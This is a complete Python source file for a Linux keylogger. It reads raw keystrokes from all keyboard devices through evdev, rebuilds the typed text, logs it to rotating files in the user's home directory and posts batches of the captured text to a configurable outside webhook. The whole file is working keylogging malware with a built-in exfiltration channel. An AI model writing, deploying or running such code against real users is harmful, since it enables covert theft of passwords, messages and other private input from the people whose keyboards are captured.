from dataclasses import dataclass
from datetime import datetime
from pathlib import Path

import requests
import time
import os

import evdev
from evdev import ecodes

import threading
from threading import Event, Lock

def get_real_home() -> Path:
    sudo_user = os.environ.get("SUDO_USER")

    if sudo_user is not None:
        return Path(f"/home/{sudo_user}")
    else:
        return Path.home()

@dataclass
class KeyloggerConfig:
    dir_path: Path = get_real_home() / "keyloggerLogs"
    initial_filename: str = "keylogger.log"
    log_size: float = 1024*1024

    webhook_url: str | None = None
    batch_size: int = 5

class WebHookDelivery:
    def __init__(self, config: KeyloggerConfig):
        self.config = config
        self._lock = Lock()
        self.buffer = []

    def add_event(self, event):
        with self._lock:
            self.buffer.append(event)
            if len(self.buffer) >= self.config.batch_size:
                self._deliver_batch()


    def _deliver_batch(self):
        text = "\n".join(self.buffer)

        try:
            if self.config.webhook_url is not None:
                payload = {"content": text}
                requests.post(self.config.webhook_url, json=payload)
        except requests.exceptions.RequestException:
            print("\n [*] Something went wrong")
        finally:
            self.buffer.clear()


    def flush(self):
        with self._lock:
            if len(self.buffer) > 0:
                self._deliver_batch()

class LogManager:
    def __init__(self, config: KeyloggerConfig):
        self.config = config
        self._lock = Lock()
        self.path = config.dir_path / config.initial_filename
        self.path.parent.mkdir(parents=True, exist_ok=True)


    def log(self, message: str):

        with self._lock:
            with open(self.path, 'a', encoding='utf-8') as element:
                element.write(f"{message}\n")
            if self.check_size():
                rotated_path = self.rotate_file()
                print(f"[*] Log rotated to: {rotated_path}")

    def check_size(self) -> bool:
        if not self.path.exists():
            return False
        else:
            actual_log_size = self.path.stat().st_size
            return actual_log_size >= self.config.log_size

    def rotate_file(self) -> Path:
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S_%f")
        new_path = self.path.with_name(f"[{timestamp}]keylogger.log")
        self.path.rename(new_path)
        return new_path

class KeyboardCapture:
    def __init__(self, on_key_event):
        self.on_key_event = on_key_event
        self.threads = []
        self.running = threading.Event()

    def _find_keyboard(self) -> list:
        devices = [evdev.InputDevice(path) for path in evdev.list_devices()]
        keyboards = []

        for device in devices:
            capabilities = device.capabilities()
            if ecodes.EV_KEY in capabilities:
                keys = capabilities[ecodes.EV_KEY]
                if len(keys) > 50:
                    keyboards.append(device)

        return keyboards

    def _listen_device(self, device) -> None:
        for event in device.read_loop():
            if not self.running.is_set():
                break

            if event.type == ecodes.EV_KEY and event.value == 1:
                key_name = ecodes.KEY[event.code]
                self.on_key_event(key_name)

    def format_key(self, key) -> str:
        if isinstance(key, list):
            key = key[0]

        if not isinstance(key, str):
            return str(key)

        if key.startswith('KEY_'):
            clean_key = key[4:]
            if len(clean_key) == 1:
                return clean_key
            return f"[{clean_key}]"

        return key

    def start(self) -> None:
        self.running.set()
        keyboards = self._find_keyboard()

        for device in keyboards:
            thread = threading.Thread(target=self._listen_device, args=(device,), daemon=True)
            thread.start()
            self.threads.append(thread)

    def stop(self) -> None:
        self.running.clear()

class Keylogger:
    def __init__(self, config: KeyloggerConfig):
        self.config = config
        self.log_manager = LogManager(config)
        self.webhook_delivery = WebHookDelivery(config)

        self.running = Event()
        self.logging = Event()
        self.capture = KeyboardCapture(on_key_event=self._on_press)
        self.buffer = []

    def start(self) -> None:
        self.running.set()
        self.logging.set()
        self.capture.start()

        while self.running.is_set():
            time.sleep(0.5)

    def end(self) -> None:
        self.running.clear()
        self.logging.clear()
        self.capture.stop()
        self._flush_buffer()
        self.webhook_delivery.flush()

    def _toggle_pause(self) -> None:
        if self.logging.is_set():
            self.logging.clear()
            self._flush_buffer()
            self.webhook_delivery.flush()
            print("[*] Keylogger paused")
            print("[*] Press f9 to resume")
        else:
            self.logging.set()
            print("[*] Keylogger resumed")
            print("[*] Press f9 to pause")

    def _flush_buffer(self) -> None:
        if len(self.buffer) > 0:
            text = "".join(self.buffer)
            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            message = f'{timestamp} -> {text}'
            self.log_manager.log(message)
            self.webhook_delivery.add_event(message)
            self.buffer.clear()

    def _on_press(self, key_name: str) -> None:
        if key_name == "KEY_F9":
            self._toggle_pause()
            return

        if not self.logging.is_set():
            return

        try:
            formatted_key = self.capture.format_key(key_name)

            if formatted_key == "[BACKSPACE]":
                if len(self.buffer) > 0:
                    self.buffer.pop()

            elif formatted_key == "[SPACE]":
                self.buffer.append(" ")

            elif formatted_key == "[ENTER]":
                self._flush_buffer()

            elif len(formatted_key) == 1:
                self.buffer.append(formatted_key)

        except Exception as e:
            print(f"\n Error on key: {e}")





def main() -> None:
    webhook_url = input("[*] Enter the webhook URL (leave empty to skip webhook delivery): ").strip()
    if webhook_url == "":
        webhook_url = None

    config = KeyloggerConfig(webhook_url=webhook_url)
    keylogger = Keylogger(config)

    try:
        keylogger.start()
    except KeyboardInterrupt:
        print(f"\n[*] Ctrl + C detected, stopping...")
    except Exception as e:
        print(f"\n[*] Unexpected error: {e}")
    finally:
        keylogger.end()

if __name__ == "__main__":
    main()